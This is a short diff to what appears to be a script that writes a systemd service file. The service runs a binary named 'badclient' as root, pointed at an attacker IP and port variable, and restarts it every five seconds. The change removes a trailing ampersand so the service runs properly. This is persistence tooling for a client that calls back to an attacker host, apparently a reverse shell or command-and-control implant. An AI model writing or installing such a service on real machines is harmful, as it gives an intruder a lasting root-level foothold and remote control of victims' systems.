@@ -16,7 +16,7 @@ After=network.target
 Type=simple
 User=root
 WorkingDirectory=$PROJECT_DIR
-ExecStart=$PROJECT_DIR/badclient -ip "$ATTACKER_IP" -port "$ATTACKER_PORT" &
+ExecStart=$PROJECT_DIR/badclient -ip "$ATTACKER_IP" -port "$ATTACKER_PORT"
 Restart=always
 RestartSec=5
 
